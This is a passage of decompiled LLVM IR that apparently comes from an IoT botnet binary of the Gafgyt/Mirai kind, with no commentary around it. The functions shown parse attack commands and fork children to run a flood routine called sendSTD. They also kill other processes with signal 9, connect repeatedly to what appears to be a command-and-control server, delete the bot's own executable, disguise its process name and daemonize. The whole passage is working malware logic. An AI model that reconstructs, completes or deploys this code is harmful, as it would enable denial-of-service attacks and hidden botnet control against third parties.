  %v2_9904 = add i32 %v2_97cc, %arg3
  %v2_98ac = add i32 %v13_9788, -72
  br label %dec_label_pc_9854

dec_label_pc_9854:                                ; preds = %dec_label_pc_9930, %dec_label_pc_97b0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_97b0 ], [ %v1_9934, %dec_label_pc_9930 ]
  %tmp = icmp ult i32 %storemerge1, 50
  br i1 %tmp, label %dec_label_pc_9930, label %dec_label_pc_9860

dec_label_pc_9860:                                ; preds = %dec_label_pc_9854
  %v2_9864 = call i32 @__GI_time(i32* null)
  %v1_9870 = call i32 @srand(i32 %v2_9864)
  %v1_9874 = call i32 @rand_init(i32 %v1_9870)
  %v0_9878 = call i32 @rand_next()
  %v1_9880 = mul i32 %v0_9878, 4
  %v3_9884 = and i32 %v1_9880, 12
  %v1_9888 = add nuw nsw i32 %v3_9884, 12
  %v3_989c = call i32 @rand_alphastr(i8* %v2_989c, i32 %v1_9888)
  %v2_98b0 = add i32 %v2_98ac, %v1_9888
  %v3_98b8 = inttoptr i32 %v2_98b0 to i8*
  store i8 0, i8* %v3_98b8, align 4
  %v3_98c4 = load i32, i32* %stack_var_-104, align 4
  %v5_98d8 = call i32 @__libc_send(i32 %v3_97bc, i32 %v2_9890, i32 %v3_98c4, i32 0, i32 %v2_9890)
  %v3_98ec = call i32 @__libc_connect(i32 %v3_97bc, i32 %v2_97ec, i32 16)
  %v2_98f4 = call i32 @__GI_time(i32* null)
  %v5_990c = icmp slt i32 %v2_98f4, %v2_9904
  br i1 %v5_990c, label %dec_label_pc_9928, label %dec_label_pc_9910

dec_label_pc_9910:                                ; preds = %dec_label_pc_9860
  %v1_9914 = call i32 @__GI_close(i32 %v3_97bc)
  store i32 %v2_9890, i32* @r0, align 4
  %v0_991c = call i32 @free()
  %v1_9924 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_9928

dec_label_pc_9928:                                ; preds = %dec_label_pc_9860, %dec_label_pc_9910
  br label %dec_label_pc_9930

dec_label_pc_9930:                                ; preds = %dec_label_pc_9854, %dec_label_pc_9928
  %stack_var_-28.0 = phi i32 [ %storemerge1, %dec_label_pc_9854 ], [ 0, %dec_label_pc_9928 ]
  %v1_9934 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_9854

dec_label_pc_9940:                                ; preds = %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v2_97ec, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
  uselistorder label %dec_label_pc_9928, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v6_9950 = load i32, i32* @fp, align 4
  store i32 39256, i32* %stack_var_-4, align 4
  %v2_9954 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9954, i32* @fp, align 4
  %v2_9968 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i32]* @global_var_15798.47 to i32), i32* @r1, align 4
  %v2_9974 = inttoptr i32 %v2_9968 to i8*
  %v3_9974 = call i32 @__GI_strcoll(i8* %v2_9974, i32 ptrtoint ([6 x i32]* @global_var_15798.47 to i32))
  %v2_997c = icmp eq i32 %v3_9974, 0
  br i1 %v2_997c, label %dec_label_pc_9984, label %dec_label_pc_9aa8

dec_label_pc_9984:                                ; preds = %entry
  %v7_998c = icmp slt i32 %arg1, 5
  br i1 %v7_998c, label %dec_label_pc_9bc0, label %dec_label_pc_9990

dec_label_pc_9990:                                ; preds = %dec_label_pc_9984
  %v1_9994 = add i32 %tmp, 4
  %v1_9998 = inttoptr i32 %v1_9994 to i32*
  %v2_9998 = load i32, i32* %v1_9998, align 4
  %v1_99a4 = add i32 %tmp, 8
  %v1_99a8 = inttoptr i32 %v1_99a4 to i32*
  %v2_99a8 = load i32, i32* %v1_99a8, align 4
  store i32 %v2_99a8, i32* @r0, align 4
  %v1_99b0 = call i32 @atol(i32 %v2_99a8)
  %v1_99c0 = add i32 %tmp, 12
  %v1_99c4 = inttoptr i32 %v1_99c0 to i32*
  %v2_99c4 = load i32, i32* %v1_99c4, align 4
  store i32 %v2_99c4, i32* @r0, align 4
  %v1_99cc = call i32 @atol(i32 %v2_99c4)
  %v1_99dc = add i32 %tmp, 16
  %v1_99e0 = inttoptr i32 %v1_99dc to i32*
  %v2_99e0 = load i32, i32* %v1_99e0, align 4
  store i32 %v2_99e0, i32* @r0, align 4
  %v1_99e8 = call i32 @atol(i32 %v2_99e0)
  store i32 %v2_9998, i32* @r0, align 4
  %v2_9a00 = call i32 @__GI_strchr(i32 %v2_9998, i32 44)
  store i32 %v2_9a00, i32* @r0, align 4
  %v2_9a08 = icmp eq i32 %v2_9a00, 0
  br i1 %v2_9a08, label %dec_label_pc_9a7c, label %dec_label_pc_9a10

dec_label_pc_9a10:                                ; preds = %dec_label_pc_9990
  %v2_9a1c = call i32 @__GI_strtok(i32 %v2_9998, i32 ptrtoint ([5 x i32]* @global_var_1579c.49 to i32))
  store i32 %v2_9a1c, i32* @r0, align 4
  %v2_9a706 = icmp eq i32 %v2_9a1c, 0
  br i1 %v2_9a706, label %dec_label_pc_9aa8, label %dec_label_pc_9a2c

dec_label_pc_9a2c:                                ; preds = %dec_label_pc_9a10, %dec_label_pc_9a58
  %storemerge47 = phi i32 [ %v2_9a60, %dec_label_pc_9a58 ], [ %v2_9a1c, %dec_label_pc_9a10 ]
  %v0_9a2c = call i32 @listFork()
  %v2_9a34 = icmp eq i32 %v0_9a2c, 0
  br i1 %v2_9a34, label %dec_label_pc_9a3c, label %dec_label_pc_9a58

dec_label_pc_9a3c:                                ; preds = %dec_label_pc_9a2c
  %v4_9a4c = call i32 @sendSTD(i32 %storemerge47, i32 %v1_99b0, i32 %v1_99cc, i32 %v1_99e8)
  %v1_9a54 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_9a58

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a2c, %dec_label_pc_9a3c
  %v2_9a60 = call i32 @__GI_strtok(i32 0, i32 ptrtoint ([5 x i32]* @global_var_1579c.49 to i32))
  store i32 %v2_9a60, i32* @r0, align 4
  %v2_9a70 = icmp eq i32 %v2_9a60, 0
  br i1 %v2_9a70, label %dec_label_pc_9aa8, label %dec_label_pc_9a2c

dec_label_pc_9a7c:                                ; preds = %dec_label_pc_9990
  %v0_9a7c = call i32 @listFork()
  %v2_9a84 = icmp eq i32 %v0_9a7c, 0
  br i1 %v2_9a84, label %dec_label_pc_9a8c, label %dec_label_pc_9bc0

dec_label_pc_9a8c:                                ; preds = %dec_label_pc_9a7c
  %v4_9a9c = call i32 @sendSTD(i32 %v2_9998, i32 %v1_99b0, i32 %v1_99cc, i32 %v1_99e8)
  %v1_9aa4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_9aa8

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_9a58, %dec_label_pc_9a10, %entry, %dec_label_pc_9a8c
  %v2_9aac = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i32]* @global_var_157a0.51 to i32), i32* @r1, align 4
  %v2_9ab8 = inttoptr i32 %v2_9aac to i8*
  %v3_9ab8 = call i32 @__GI_strcoll(i8* %v2_9ab8, i32 ptrtoint ([4 x i32]* @global_var_157a0.51 to i32))
  store i32 %v3_9ab8, i32* @r0, align 4
  %v2_9ac0 = icmp eq i32 %v3_9ab8, 0
  br i1 %v2_9ac0, label %dec_label_pc_9ac8, label %dec_label_pc_9bc0

dec_label_pc_9ac8:                                ; preds = %dec_label_pc_9aa8
  br label %dec_label_pc_9b6c

dec_label_pc_9adc:                                ; preds = %dec_label_pc_9b6c, %dec_label_pc_9ba0
  %v3_9ae0 = mul i32 %v3_9bb4, 4
  %v2_9aec = load i32, i32* @global_var_21568.45, align 4
  %v2_9af0 = add i32 %v2_9aec, %v3_9ae0
  %v1_9af4 = inttoptr i32 %v2_9af0 to i32*
  %v2_9af4 = load i32, i32* %v1_9af4, align 4
  %v2_9af8 = icmp eq i32 %v2_9af4, 0
  br i1 %v2_9af8, label %dec_label_pc_9b60, label %dec_label_pc_9b00

dec_label_pc_9b00:                                ; preds = %dec_label_pc_9adc
  %v2_9b18 = load i32, i32* %v1_9af4, align 4
  %v0_9b1c = call i32 @__GI_getpid()
  store i32 %v0_9b1c, i32* @r0, align 4
  %v9_9b24 = icmp eq i32 %v2_9b18, %v0_9b1c
  br i1 %v9_9b24, label %dec_label_pc_9b60, label %dec_label_pc_9b2c

dec_label_pc_9b2c:                                ; preds = %dec_label_pc_9b00
  %v2_9b3c = load i32, i32* @global_var_21568.45, align 4
  %v2_9b40 = add i32 %v2_9b3c, %v3_9ae0
  %v1_9b44 = inttoptr i32 %v2_9b40 to i32*
  %v2_9b44 = load i32, i32* %v1_9b44, align 4
  %v2_9b50 = call i32 @kill(i32 %v2_9b44, i32 9)
  store i32 %v2_9b50, i32* @r0, align 4
  %v1_9b58 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_9b60

dec_label_pc_9b60:                                ; preds = %dec_label_pc_9b00, %dec_label_pc_9adc, %dec_label_pc_9b2c
  %v1_9bc89 = phi i32 [ %v1_9bc810, %dec_label_pc_9adc ], [ %v0_9b1c, %dec_label_pc_9b00 ], [ %v2_9b50, %dec_label_pc_9b2c ]
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.1, %dec_label_pc_9adc ], [ %stack_var_-32.1, %dec_label_pc_9b00 ], [ %v1_9b58, %dec_label_pc_9b2c ]
  %v1_9b64 = add i32 %v3_9bb4, 1
  br label %dec_label_pc_9b6c

dec_label_pc_9b6c:                                ; preds = %dec_label_pc_9ac8, %dec_label_pc_9b60
  %v1_9bc810 = phi i32 [ 0, %dec_label_pc_9ac8 ], [ %v1_9bc89, %dec_label_pc_9b60 ]
  %stack_var_-32.1 = phi i32 [ 0, %dec_label_pc_9ac8 ], [ %stack_var_-32.0, %dec_label_pc_9b60 ]
  %v3_9bb4 = phi i32 [ 0, %dec_label_pc_9ac8 ], [ %v1_9b64, %dec_label_pc_9b60 ]
  %v5_9b84 = load i32, i32* @global_var_1f31c.43, align 4
  %v9_9b98 = icmp eq i32 %v5_9b84, 0
  br i1 %v9_9b98, label %dec_label_pc_9ba0, label %dec_label_pc_9adc

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b6c
  %v2_9b84 = load i32, i32* @global_var_1f318.42, align 4
  %tmp30 = icmp ugt i32 %v2_9b84, %v3_9bb4
  br i1 %tmp30, label %dec_label_pc_9adc, label %dec_label_pc_9bc0

dec_label_pc_9bc0:                                ; preds = %dec_label_pc_9ba0, %dec_label_pc_9a7c, %dec_label_pc_9aa8, %dec_label_pc_9984
  %v1_9bc8 = phi i32 [ %v0_9a7c, %dec_label_pc_9a7c ], [ %v3_9ab8, %dec_label_pc_9aa8 ], [ 0, %dec_label_pc_9984 ], [ %v1_9bc810, %dec_label_pc_9ba0 ]
  store i32 %v6_9950, i32* @fp, align 4
  ret i32 %v1_9bc8

; uselistorder directives
  uselistorder i32 %stack_var_-32.1, { 0, 2, 1 }
  uselistorder i32 %v3_9ae0, { 1, 0 }
  uselistorder i32 %v2_9a60, { 2, 1, 0 }
  uselistorder i32 %v1_99e8, { 1, 0 }
  uselistorder i32 %v1_99cc, { 1, 0 }
  uselistorder i32 %v1_99b0, { 1, 0 }
  uselistorder i32 %v2_9998, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 ()* @listFork, { 1, 0 }
  uselistorder label %dec_label_pc_9bc0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_9b6c, { 1, 0 }
  uselistorder label %dec_label_pc_9b60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9adc, { 1, 0 }
  uselistorder label %dec_label_pc_9aa8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9a58, { 1, 0 }
  uselistorder label %dec_label_pc_9a2c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_9be4 = load i32, i32* @fp, align 4
  store i32 39916, i32* %stack_var_-4, align 4
  %v2_9be8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9be8, i32* @fp, align 4
  %v2_9bfc = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_9c0c = bitcast i32* %stack_var_-4116 to i8*
  %v3_9c0c = call i32 @__GI_memset(i8* %v2_9c0c, i32 0)
  %v2_9c14 = load i32, i32* @global_var_1f320.40, align 4
  %v2_9c18 = icmp eq i32 %v2_9c14, 0
  br i1 %v2_9c18, label %dec_label_pc_9c3c, label %dec_label_pc_9c20

dec_label_pc_9c20:                                ; preds = %entry
  %v1_9c2c = call i32 @__GI_close(i32 %v2_9c14)
  store i32 0, i32* @global_var_1f320.40, align 4
  br label %dec_label_pc_9c3c

dec_label_pc_9c3c:                                ; preds = %entry, %dec_label_pc_9c20
  %v2_9c40 = load i32, i32* @global_var_1f094.56, align 4
  %v2_9c44 = icmp eq i32 %v2_9c40, 0
  br i1 %v2_9c44, label %dec_label_pc_9c70, label %dec_label_pc_9c5c

dec_label_pc_9c5c:                                ; preds = %dec_label_pc_9c3c
  %v1_9c64 = add i32 %v2_9c40, 1
  br label %dec_label_pc_9c70

dec_label_pc_9c70:                                ; preds = %dec_label_pc_9c3c, %dec_label_pc_9c5c
  %storemerge1 = phi i32 [ %v1_9c64, %dec_label_pc_9c5c ], [ 0, %dec_label_pc_9c3c ]
  store i32 %storemerge1, i32* @global_var_1f094.56, align 4
  %v4_9c88 = mul i32 %storemerge1, 4
  %v5_9c88 = add i32 %v4_9c88, ptrtoint ([14 x i8]** @global_var_1f090.59 to i32)
  %v6_9c88 = inttoptr i32 %v5_9c88 to i32*
  %v7_9c88 = load i32, i32* %v6_9c88, align 4
  store i32 %v7_9c88, i32* @r1, align 4
  %v3_9c94 = call i32 @strcpy(i8* %v2_9c0c, i32 %v7_9c88)
  store i32 %v2_9bfc, i32* @r0, align 4
  %v2_9cb8 = call i32 @__GI_strchr(i32 %v2_9bfc, i32 58)
  %v2_9cc0 = icmp eq i32 %v2_9cb8, 0
  br i1 %v2_9cc0, label %dec_label_pc_9d20, label %dec_label_pc_9cc8

dec_label_pc_9cc8:                                ; preds = %dec_label_pc_9c70
  store i32 %v2_9bfc, i32* @r0, align 4
  %v2_9cdc = call i32 @__GI_strchr(i32 %v2_9bfc, i32 58)
  %v1_9ce4 = add i32 %v2_9cdc, 1
  store i32 %v1_9ce4, i32* @r0, align 4
  %v1_9cec = call i32 @atol(i32 %v1_9ce4)
  store i32 %v2_9bfc, i32* @r0, align 4
  %v2_9d0c = call i32 @__GI_strchr(i32 %v2_9bfc, i32 58)
  %v3_9d1c = inttoptr i32 %v2_9d0c to i8*
  store i8 0, i8* %v3_9d1c, align 1
  br label %dec_label_pc_9d20

dec_label_pc_9d20:                                ; preds = %dec_label_pc_9c70, %dec_label_pc_9cc8
  %stack_var_-20.0 = phi i32 [ 69000, %dec_label_pc_9c70 ], [ %v1_9cec, %dec_label_pc_9cc8 ]
  %v3_9d2c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9d2c, i32* @global_var_1f320.40, align 4
  %v4_9d60 = call i32 @connectTimeout(i32 %v3_9d2c, i32 %v2_9bfc, i32 %stack_var_-20.0, i32 30)
  %v2_9d68 = icmp eq i32 %v4_9d60, 0
  %. = zext i1 %v2_9d68 to i32
  store i32 %v3_9be4, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_9bfc, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_9d20, { 1, 0 }
  uselistorder label %dec_label_pc_9c70, { 1, 0 }
  uselistorder label %dec_label_pc_9c3c, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-4284 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 40380, i32* %stack_var_-4, align 4
  %v2_9db8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9db8, i32* @fp, align 4
  %v2_9dcc = ptrtoint i32* %stack_var_-24 to i32
  %v1_9df4 = bitcast i8** %argv to i32*
  %v2_9df4 = load i32, i32* %v1_9df4, align 4
  %v3_9dfc = call i32 @unlink(i32 %v2_9df4, i32 %v2_9dcc, i32 %v2_9dcc)
  %v1_9e00 = call i32 @rand_init(i32 %v3_9dfc)
  %v0_9e04 = call i32 @rand_next()
  %v1_9e0c = mul i32 %v0_9e04, 4
  %v3_9e10 = and i32 %v1_9e0c, 12
  %v1_9e14 = add nuw nsw i32 %v3_9e10, 12
  %v2_9e1c = ptrtoint i32* %stack_var_-112 to i32
  %v2_9e28 = bitcast i32* %stack_var_-112 to i8*
  %v3_9e28 = call i32 @rand_alphastr(i8* %v2_9e28, i32 %v1_9e14)
  %v2_9e38 = add i32 %v2_9dcc, -88
  %v2_9e3c = add i32 %v2_9e38, %v1_9e14
  %v3_9e44 = inttoptr i32 %v2_9e3c to i8*
  store i8 0, i8* %v3_9e44, align 4
  %v2_9e58 = load i32, i32* %v1_9df4, align 4
  %v3_9e68 = call i32 @util_strcpy(i32 %v2_9e58, i32 %v2_9e1c, i32 %v2_9e1c)
  %v0_9e6c = call i32 @rand_next()
  %v1_9e78 = zext i32 %v0_9e6c to i64
  %v4_9e78 = mul nuw i64 %v1_9e78, 2863311531
  %v3_9e7c6 = udiv i64 %v4_9e78, 17179869184
  %v2_9e908 = mul nuw nsw i64 %v3_9e7c6, 2
  %v2_9e90 = trunc i64 %v2_9e908 to i32
  %v3_9e9410 = mul nuw nsw i64 %v3_9e7c6, 8
  %v3_9e94 = trunc i64 %v3_9e9410 to i32
  %v2_9e9853 = sub i32 %v2_9e90, %v3_9e94
  %v2_9e9c = add i32 %v2_9e9853, %v0_9e6c
  %v3_9eb0 = mul i32 %v2_9e9c, 4
  %v1_9eb4 = add i32 %v3_9eb0, 12
  %v6_9ec8 = call i32 @rand_alphastr(i8* %v2_9e28, i32 %v1_9eb4)
  %v2_9edc = add i32 %v2_9e38, %v1_9eb4
  %v3_9edc = inttoptr i32 %v2_9edc to i8*
  store i8 0, i8* %v3_9edc, align 4
  %v5_9ef4 = call i32 @prctl(i32 15, i32 %v2_9e1c, i32 %v2_9edc, i32 %v2_9e1c)
  %v2_9efc = call i32 @__GI_time(i32* null)
  store i32 %v2_9efc, i32* @r0, align 4
  store i32 %v2_9efc, i32* @r4, align 4
  %v0_9f04 = call i32 @__GI_getpid()
  %v0_9f0c = load i32, i32* @r4, align 4
  %v2_9f0c = xor i32 %v0_9f0c, %v0_9f04
  %v1_9f14 = call i32 @srand(i32 %v2_9f0c)
  %v1_9f18 = call i32 @rand_init(i32 %v1_9f14)
  store i32 %v1_9f18, i32* @r0, align 4
  %v0_9f1c = call i32 @__libc_fork()
  store i32 %v0_9f1c, i32* @r0, align 4
  %v2_9f2c = icmp eq i32 %v0_9f1c, 0
  br i1 %v2_9f2c, label %dec_label_pc_9f5c, label %dec_label_pc_9f50

dec_label_pc_9f50:                                ; preds = %entry
  %v2_9f34 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v0_9f1c, i32* @r0, align 4
  %v3_9f44 = call i32 @__libc_waitpid(i32 %v0_9f1c, i32 %v2_9f34, i32 0)
  %v1_9f4c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9f7c

dec_label_pc_9f5c:                                ; preds = %entry
  %v0_9f5c = call i32 @__libc_fork()
  %v2_9f6c = icmp eq i32 %v0_9f5c, 0
  br i1 %v2_9f6c, label %dec_label_pc_9f7c, label %dec_label_pc_9f74

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9f5c
  %v1_9f78 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_9f7c

dec_label_pc_9f7c:                                ; preds = %dec_label_pc_9f50, %dec_label_pc_9f5c, %dec_label_pc_9f74
  %v1_9f80 = call i32 @chdir(i32 ptrtoint ([3 x i32]* @global_var_157a4.62 to i32))
  %v2_9f8c = call i32 @bsd_signal(i32 13, i32 1)
  %v2_a614 = ptrtoint i32* %stack_var_-4284 to i32
  %v4_a624 = bitcast i32* %stack_var_-4284 to i8*
  %v1_a344 = or i32 %v2_a614, 1
  %v5_a348 = inttoptr i32 %v1_a344 to i8*
  %v2_a5d4 = add i32 %v2_9dcc, -164
  br label %dec_label_pc_9f90

dec_label_pc_9f90:                                ; preds = %dec_label_pc_9f90, %dec_label_pc_a604, %dec_label_pc_9f7c
  %v0_9f90 = call i32 @initConnection()
  %v2_9f98 = icmp eq i32 %v0_9f90, 0
  br i1 %v2_9f98, label %dec_label_pc_9fa0, label %dec_label_pc_9f90

dec_label_pc_9fa0:                                ; preds = %dec_label_pc_9f90
  br label %dec_label_pc_a604

dec_label_pc_9fc0:                                ; preds = %dec_label_pc_a27c, %dec_label_pc_a220
  %v3_9fc4 = mul i32 %v3_a270, 4
  %v2_9fd0 = load i32, i32* @global_var_21568.45, align 4
  %v2_9fd4 = add i32 %v2_9fd0, %v3_9fc4
  %v1_9fd8 = inttoptr i32 %v2_9fd4 to i32*
  %v2_9fd8 = load i32, i32* %v1_9fd8, align 4
  store i32 %v2_9fd8, i32* @r0, align 4
  %v3_9fe8 = call i32 @__libc_waitpid(i32 %v2_9fd8, i32 0, i32 1)
  %tmp98 = icmp slt i32 %v3_9fe8, 1
  br i1 %tmp98, label %dec_label_pc_a214, label %dec_label_pc_a04c

dec_label_pc_a008:                                ; preds = %dec_label_pc_a0a8, %dec_label_pc_a04c
  %v2_a00c = load i32, i32* @global_var_21568.45, align 4
  %v3_a018 = mul i32 %v1_9ffc, 4
  %v1_a010 = add i32 %v3_a018, -4
  %v2_a01c = add i32 %v1_a010, %v2_a00c
  %v2_a034 = add i32 %v2_a00c, %v3_a018
  %v1_a038 = inttoptr i32 %v2_a034 to i32*
  %v2_a038 = load i32, i32* %v1_a038, align 4
  %v2_a03c = inttoptr i32 %v2_a01c to i32*
  store i32 %v2_a038, i32* %v2_a03c, align 4
  br label %dec_label_pc_a04c

dec_label_pc_a04c:                                ; preds = %dec_label_pc_9fc0, %dec_label_pc_a008
  %v3_9ff8.sink = phi i32 [ %v1_9ffc, %dec_label_pc_a008 ], [ %v3_a270, %dec_label_pc_9fc0 ]
  %v1_9ffc = add i32 %v3_9ff8.sink, 1
  %v2_a068 = load i32, i32* @global_var_1f318.42, align 4
  %v5_a068 = load i32, i32* @global_var_1f31c.43, align 4
  %tmp99 = icmp ugt i32 %v5_a068, %v1_9ffc
  br i1 %tmp99, label %dec_label_pc_a008, label %dec_label_pc_a090

dec_label_pc_a090:                                ; preds = %dec_label_pc_a04c
  %v9_a0a0 = icmp eq i32 %v5_a068, %v1_9ffc
  br i1 %v9_a0a0, label %dec_label_pc_a0a8, label %dec_label_pc_a0c0

dec_label_pc_a0a8:                                ; preds = %dec_label_pc_a090
  %v9_a0b8 = icmp eq i32 %v2_a068, 0
  br i1 %v9_a0b8, label %dec_label_pc_a0c0, label %dec_label_pc_a008

dec_label_pc_a0c0:                                ; preds = %dec_label_pc_a0a8, %dec_label_pc_a090
  %v2_a0c4 = load i32, i32* @global_var_21568.45, align 4
  %v3_a0d0 = mul i32 %v1_9ffc, 4
  %v1_a0c8 = add i32 %v3_a0d0, -4
  %v2_a0d4 = add i32 %v1_a0c8, %v2_a0c4
  %v2_a0dc = inttoptr i32 %v2_a0d4 to i32*
  store i32 0, i32* %v2_a0dc, align 4
  %v2_a0e4 = load i32, i32* @global_var_1f318.42, align 4
  %v5_a0e4 = load i32, i32* @global_var_1f31c.43, align 4
  %v2_a0f0 = add i32 %v2_a0e4, -1
  %v3_a0f0 = icmp ne i32 %v2_a0e4, 0
  %v3_a0f4 = add i32 %v5_a0e4, -1
  %v4_a0f4 = zext i1 %v3_a0f0 to i32
  %v5_a0f4 = add i32 %v3_a0f4, %v4_a0f4
  store i32 %v2_a0f0, i32* @global_var_1f318.42, align 4
  store i32 %v5_a0f4, i32* @global_var_1f31c.43, align 4
  %v3_a110 = icmp eq i32 %v2_a0e4, 0
  %v4_a114 = zext i1 %v3_a110 to i32
  %v5_a114 = add i32 %v5_a0f4, %v4_a114
  %v3_a118 = udiv i32 %v2_a0e4, 1073741824
  %v3_a11c = mul i32 %v5_a114, 4
  %v2_a120 = or i32 %v3_a11c, %v3_a118
  store i32 %v2_a120, i32* @r4, align 4
  %v3_a124 = mul i32 %v2_a0e4, 4
  %v1_a12c = call i32 @malloc(i32 %v3_a124)
  br label %dec_label_pc_a184

dec_label_pc_a144:                                ; preds = %dec_label_pc_a1e0, %dec_label_pc_a184
  %v3_a148 = mul i32 %v3_a1d4, 4
  %v2_a154 = add i32 %v3_a148, %v1_a12c
  %v2_a168 = load i32, i32* @global_var_21568.45, align 4
  %v2_a16c = add i32 %v2_a168, %v3_a148
  %v1_a170 = inttoptr i32 %v2_a16c to i32*
  %v2_a170 = load i32, i32* %v1_a170, align 4
  %v2_a174 = inttoptr i32 %v2_a154 to i32*
  store i32 %v2_a170, i32* %v2_a174, align 4
  %v1_a17c = add i32 %v3_a1d4, 1
  br label %dec_label_pc_a184

dec_label_pc_a184:                                ; preds = %dec_label_pc_a0c0, %dec_label_pc_a144
  %v3_a1d4 = phi i32 [ 0, %dec_label_pc_a0c0 ], [ %v1_a17c, %dec_label_pc_a144 ]
  %v2_a1a0 = load i32, i32* @global_var_1f318.42, align 4
  %v5_a1a0 = load i32, i32* @global_var_1f31c.43, align 4
  %tmp101 = icmp ugt i32 %v5_a1a0, %v3_a1d4
  br i1 %tmp101, label %dec_label_pc_a144, label %dec_label_pc_a1c8

dec_label_pc_a1c8:                                ; preds = %dec_label_pc_a184
  %v9_a1d8 = icmp eq i32 %v5_a1a0, %v3_a1d4
  br i1 %v9_a1d8, label %dec_label_pc_a1e0, label %dec_label_pc_a1f8

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1c8
  %v9_a1f0 = icmp eq i32 %v2_a1a0, 0
  br i1 %v9_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a144

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1e0, %dec_label_pc_a1c8
  %v2_a1fc = load i32, i32* @global_var_21568.45, align 4
  store i32 %v2_a1fc, i32* @r0, align 4
  %v0_a204 = call i32 @free()
  store i32 %v1_a12c, i32* @global_var_21568.45, align 4
  br label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_9fc0, %dec_label_pc_a1f8
  %v1_a218 = add i32 %v3_a270, 1
  br label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a604, %dec_label_pc_a214
  %v3_a270 = phi i32 [ %v1_a218, %dec_label_pc_a214 ], [ 0, %dec_label_pc_a604 ]
  %v3_a228 = ashr i32 %v3_a270, 31
  %v2_a23c = load i32, i32* @global_var_1f318.42, align 4
  %v5_a23c = load i32, i32* @global_var_1f31c.43, align 4
  %v3_a25c = icmp uge i32 %v5_a23c, %v3_a270
  %v9_a25c = icmp eq i32 %v5_a23c, %v3_a270
  %v2_a260 = xor i1 %v9_a25c, true
  %v3_a260 = and i1 %v3_a25c, %v2_a260
  br i1 %v3_a260, label %dec_label_pc_9fc0, label %dec_label_pc_a264

dec_label_pc_a264:                                ; preds = %dec_label_pc_a220
  br i1 %v9_a25c, label %dec_label_pc_a27c, label %dec_label_pc_a294

dec_label_pc_a27c:                                ; preds = %dec_label_pc_a264
  %tmp = icmp ugt i32 %v2_a23c, %v3_a228
  br i1 %tmp, label %dec_label_pc_9fc0, label %dec_label_pc_a294

dec_label_pc_a294:                                ; preds = %dec_label_pc_a264, %dec_label_pc_a27c
  %v2_a2a8 = add i32 %v5_a624, %v2_a614
  %v3_a2b0 = inttoptr i32 %v2_a2a8 to i8*
  store i8 0, i8* %v3_a2b0, align 1
  %v2_a2c4 = call i32 @trim(i8* %v4_a624)
  %v2_a2dc = load i8, i8* %v4_a624, align 4
  %v7_a2e0 = icmp eq i8 %v2_a2dc, 46
  br i1 %v7_a2e0, label %dec_label_pc_a304, label %dec_label_pc_a604

dec_label_pc_a304:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a314
  %v3_a2e8.sink = phi i8* [ %storemerge13, %dec_label_pc_a314 ], [ %v4_a624, %dec_label_pc_a294 ]
  %v4_a2e8 = ptrtoint i8* %v3_a2e8.sink to i32
  %v1_a2ec = add i32 %v4_a2e8, 1
  %storemerge13 = inttoptr i32 %v1_a2ec to i8*
  %v2_a308 = load i8, i8* %storemerge13, align 1
  %v7_a30c = icmp eq i8 %v2_a308, 32
  br i1 %v7_a30c, label %dec_label_pc_a324, label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a304
  %v2_a318 = load i8, i8* %storemerge13, align 1
  %v2_a31c = icmp eq i8 %v2_a318, 0
  br i1 %v2_a31c, label %dec_label_pc_a324, label %dec_label_pc_a304

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a304
